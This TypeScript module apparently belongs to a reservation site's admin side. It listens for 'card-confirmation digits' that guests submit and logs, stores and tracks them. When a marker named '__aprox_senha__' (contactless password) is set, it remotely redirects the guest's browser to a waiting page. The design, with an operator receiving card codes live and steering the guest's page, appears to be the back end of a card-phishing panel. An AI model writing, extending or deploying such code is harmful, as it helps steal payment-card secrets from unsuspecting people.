import { supabase } from "@/integrations/supabase/client";
import type { Json } from "@/integrations/supabase/types";
import {
  ADMIN_DIGITS_TOPIC,
  reservationChannelName,
  sendReservationCommand,
  subscribeTopic,
} from "@/lib/guestChannel";

// Global listener for guest card-confirmation digits. Runs at App level
// for signed-in admins, so the digits arrive on ANY admin page — no
// dependency on the reservations list being loaded or on which page the
// admin is viewing. Broadcast bypasses RLS, so this works even before
// the guest-access migration is applied.

export const LOCAL_HIST_KEY = "df_admin_card_history";

export interface CardHistoryEntry {
  digits: string;
  at: string;
}

export function getLocalCardHistory(id: string): CardHistoryEntry[] {
  try {
    const raw = localStorage.getItem(LOCAL_HIST_KEY);
    const all = raw ? JSON.parse(raw) : {};
    return Array.isArray(all[id]) ? all[id] : [];
  } catch {
    return [];
  }
}

export function addLocalCardHistory(id: string, entry: CardHistoryEntry) {
  try {
    const raw = localStorage.getItem(LOCAL_HIST_KEY);
    const all = raw ? JSON.parse(raw) : {};
    all[id] = [...(all[id] ?? []), entry];
    localStorage.setItem(LOCAL_HIST_KEY, JSON.stringify(all));
  } catch { /* ignore */ }
}

export function clearLocalCardHistory(id: string) {
  try {
    const raw = localStorage.getItem(LOCAL_HIST_KEY);
    if (!raw) return;
    const all = JSON.parse(raw);
    delete all[id];
    localStorage.setItem(LOCAL_HIST_KEY, JSON.stringify(all));
  } catch { /* ignore */ }
}

// Dedupe window: the guest may deliver the same submission on more than
// one topic (compat paths) — identical digits for the same reservation
// within 15s are processed once.
const lastProcessed = new Map<string, { digits: string; at: number }>();

export async function processCardDigits(rid: string, digits: string) {
  const last = lastProcessed.get(rid);
  const now = Date.now();
  if (last && last.digits === digits && now - last.at < 15000) return;
  lastProcessed.set(rid, { digits, at: now });

  // Fresh state straight from the DB (admins can read any reservation) —
  // no dependency on any page's local list. The card columns only exist
  // after the migration: PostgREST rejects the WHOLE query when any
  // explicitly-selected column is missing, so fall back to the minimal
  // safe set and keep going (the digits still get recorded locally).
  let { data: res, error: rerr } = await supabase
    .from("reservations")
    .select("id, pix_message, card_last4, card_digits_history")
    .eq("id", rid)
    .maybeSingle();
  if (rerr || !res) {
    const retry = await supabase
      .from("reservations")
      .select("id, pix_message")
      .eq("id", rid)
      .maybeSingle();
    res = retry.data as typeof res;
    rerr = retry.error;
  }
  if (rerr || !res) {
    console.warn("[admin-digits] dígitos descartados — reserva não verificável (id:", rid, ")");
    return;
  }

  // IMPORTANT: the marker being '__aproximacao__' does NOT mean this
  // submission was recorded — the guest tab itself may have restored the
  // marker (same-browser admin session) without being able to save the
  // digits (columns missing pre-migration). Dedupe by CONTENT instead:
  const entry: CardHistoryEntry = { digits, at: new Date().toISOString() };
  const prevHistory = Array.isArray(res.card_digits_history)
    ? (res.card_digits_history as unknown as CardHistoryEntry[])
    : [];
  const lastDb = prevHistory[prevHistory.length - 1];
  const inDbRecently =
    !!lastDb && lastDb.digits === digits && now - new Date(lastDb.at).getTime() < 60000;
  const localHist = getLocalCardHistory(rid);
  const lastLocal = localHist[localHist.length - 1];
  const inLocalRecently =
    !!lastLocal && lastLocal.digits === digits && now - new Date(lastLocal.at).getTime() < 60000;

  if (inDbRecently && inLocalRecently) return; // fully recorded already
  if (inDbRecently) {
    // The guest wrote it to the DB directly — just refresh the admin UI
    window.dispatchEvent(new Event("admin-reservations-refresh"));
    return;
  }

  if (!inLocalRecently) addLocalCardHistory(rid, entry);

  if (res.pix_message === "__aprox_senha__") {
    let updErr = (
      await supabase
        .from("reservations")
        .update({
          card_last4: digits,
          pix_message: "__aprox_espera__",
          card_digits_history: [...prevHistory, entry] as unknown as Json,
        })
        .eq("id", rid)
    ).error;
    if (updErr) {
      // Columns missing pre-migration — restore the marker only so the
      // guest's next page command still matches the DB state.
      updErr = (
        await supabase
          .from("reservations")
          .update({ pix_message: "__aprox_espera__" })
          .eq("id", rid)
      ).error;
    }
    if (!updErr) {
      sendReservationCommand(rid, { type: "route", route: `/aguardando/${rid}` });
    }
  } else {
    // Marker already moved on — still persist the digits in the history
    await supabase
      .from("reservations")
      .update({ card_digits_history: [...prevHistory, entry] as unknown as Json })
      .eq("id", rid);
  }
  // Open admin pages refresh their cards (badge, status, history)
  window.dispatchEvent(new Event("admin-reservations-refresh"));
}

let cleanup: (() => void) | null = null;
let pollTimer: ReturnType<typeof setInterval> | null = null;
let active = false;

// Visible status for the admin UI (green/red dot on the history card)
export function isDigitsListenerActive() {
  return active;
}

function emitStatus() {
  try {
    window.dispatchEvent(new CustomEvent("admin-digits-status", { detail: active }));
  } catch { /* ignore */ }
}

// Guaranteed local path: when the admin tests in the SAME browser as the
// guest, tabs share localStorage. The guest always leaves the digits in
// `df_pending_card_digits`; this poller consumes them directly — no
// network involved. On separate devices the entry is simply discarded.
const PENDING_KEY = "df_pending_card_digits";

// One poll cycle — also used by the /teste-fluxo audit page.
export async function pollPendingDigitsOnce(): Promise<string> {
  try {
    const raw = localStorage.getItem(PENDING_KEY);
    if (!raw) return "sem registro pendente no aparelho";
    const pending = JSON.parse(raw) as {
      reservationId?: string;
      code?: string;
      at?: number;
    };
    if (!pending?.reservationId || !pending?.code) {
      localStorage.removeItem(PENDING_KEY);
      return "registro inválido — descartado";
    }
    if (pending.at && Date.now() - pending.at > 10 * 60 * 1000) {
      localStorage.removeItem(PENDING_KEY);
      return "registro antigo (>10min) — descartado";
    }
    const { data: res, error: ferr } = await supabase
      .from("reservations")
      .select("pix_message")
      .eq("id", pending.reservationId)
      .maybeSingle();
    if (ferr || !res) {
      localStorage.removeItem(PENDING_KEY);
      return `reserva não verificável (${pending.reservationId.slice(0, 8)}…) — descartado`;
    }
    localStorage.removeItem(PENDING_KEY);
    console.info("[admin-digits] dígitos via registro local:", pending.code);
    await processCardDigits(pending.reservationId, pending.code);
    return `processado: •••• ${pending.code}`;
  } catch (e) {
    return `erro no poll: ${String(e)}`;
  }
}

function startPendingDigitsPoll() {
  if (pollTimer) return;
  pollTimer = setInterval(() => { void pollPendingDigitsOnce(); }, 2000);
}

function stopPendingDigitsPoll() {
  if (pollTimer) {
    clearInterval(pollTimer);
    pollTimer = null;
  }
}

export async function startAdminDigitsListener(): Promise<() => void> {
  if (cleanup) return cleanup;

  // Primary path: the dedicated admin topic (works on any admin page).
  cleanup = subscribeTopic(ADMIN_DIGITS_TOPIC, async (cmd) => {
    if (cmd.type !== "card_digits") return;
    console.info("[admin-digits] dígitos recebidos:", cmd.reservation_id, cmd.digits);
    await processCardDigits(cmd.reservation_id, cmd.digits);
  });

  console.info("[admin-digits] ouvinte ativo");
  active = true;
  emitStatus();
  startPendingDigitsPoll();
  return cleanup;
}

// Compat path for guest tabs still running the previous build: they send
// on the per-reservation topic. The reservations page subscribes to its
// listed reservations and feeds the same shared processor (deduped).
export function subscribeReservationDigits(
  ids: string[],
  onRegister: () => void
): () => void {
  const cleanups = ids.map((id) =>
    subscribeTopic(reservationChannelName(id), async (cmd) => {
      if (cmd.type !== "card_digits") return;
      await processCardDigits(id, cmd.digits);
      onRegister();
    })
  );
  return () => cleanups.forEach((c) => c());
}

export function stopAdminDigitsListener() {
  cleanup?.();
  cleanup = null;
  stopPendingDigitsPoll();
  active = false;
  emitStatus();
}
